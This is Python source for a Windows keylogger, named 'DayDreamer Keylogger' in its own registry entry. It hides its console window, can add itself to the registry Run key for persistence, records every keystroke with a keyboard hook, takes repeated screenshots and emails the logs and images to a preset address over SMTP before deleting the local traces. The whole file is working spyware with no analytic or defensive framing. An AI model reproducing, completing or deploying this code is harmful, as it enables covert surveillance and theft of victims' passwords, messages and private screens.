# -*- coding: utf-8 -*-

import os
import time
import random
import _winreg
import smtplib
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name="daydreamer.py"
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
    keyVal,0,_winreg.KEY_ALL_ACCESS)

    _winreg.SetValueEx(key2change, "DayDreamer Keylogger",0,_winreg.REG_SZ, new_file_path)


def delete():
	pth=os.getcwd()
	print "[+] Deleted Files"
	for i in x:
		remove_dic=pth+"\\"+i
		os.remove(remove_dic)
	fp=open("keylogs.txt","w")
	fp.write("")
	x[:]=[]
	exit()

def Screen():
	global x
	pth=os.getcwd()
	record_time=time.strftime('%d%m%y-%H%M%S')
	file_name="screenshoot"+record_time+".jpg"
	file_dic=pth+"\\"+file_name
	img = ImageGrab.grab()
	img.save(file_dic)
	x.append(file_name)
	print "[+] ScreenShooted"

def SendMail():
	
	print "[+] Sending Mail"
	user = "@hotmail.com"
	passwd = "********"
	to_addr = "@mailadres"
	pth=os.getcwd()
	msg=MIMEMultipart()
	TxtFileName=pth+"\\"+'keylogs.txt'
	y=os.path.exists ("keylogs.txt")
	print y
	time.sleep(10)
	txt_data=open(TxtFileName,"r").read()

	msg['Subject']="ScreenShoot Log"
	msg['From']=user
	msg['To']=to_addr
	

	text=MIMEText('test')
	msg.attach(text)
	
	file=MIMEText(txt_data)
	file.add_header('Content-Disposition', 'attachment', filename=TxtFileName)
	msg.attach(file)
	for i in x:
		ImgFileName=pth+"\\"+i
		img_data=open(ImgFileName,"rb").read()
		image=MIMEImage(img_data)		
		msg.attach(image)
		print ImgFileName
		time.sleep(2)

		
	smtp = smtplib.SMTP("smtp.live.com",587)
	smtp.ehlo()
	smtp.starttls()
	smtp.ehlo()
	smtp.login(user, passwd)
	smtp.sendmail(user, to_addr, msg.as_string())
	smtp.quit()
	
	print "[+] Sended Mail"

def KeyLogger():
  import pyHook
  import pythoncom
  
  global metin
  global keys
  global i
  
  def OnKeyboardEvent(event):
    global metin
    global keys
    global i
    try:
		if event.KeyID==13:
			keys="\n"
		elif 0<=event.KeyID<32:
			keys="<"+str(event.Key)+">"
		elif event.KeyID==32:
			keys=" "
		elif 161<=event.KeyID<=165:
			keys="<"+str(event.Key)+">"
		else:
			keys=chr(event.Ascii)
		i=i+1
		metin+=keys
		if i==10:  
			fp=open("keylogs.txt","a+")
			fp.write(metin)
			fp.close()
			metin=''
			i=0
    except ValueError:
		pass
	
    return True
  
  metin=""
  keys=""
  i=0
  z=0
  
  hm = pyHook.HookManager()
  hm.KeyDown = OnKeyboardEvent
  hm.HookKeyboard()
  try:
	print "[+] Recording...."
	while True:
		z=z+1
		pythoncom.PumpWaitingMessages()
		print z
		if z==50000:
			break
  except KeyboardInterrupt:
	pass			
	
def Main():
	global x
	global count
	#addStartup()
	hide()
	fp=open("keylogs.txt","w")
	fp.write("")
	while True:	
		while True:
			if count%3!=0:
				time.sleep(1)
				KeyLogger()
				Screen()
				print count
			else:
				SendMail()
				delete()
			count=count+1
				
if __name__ == '__main__':
	x=[]
	i=0
	count=1
	Main()
	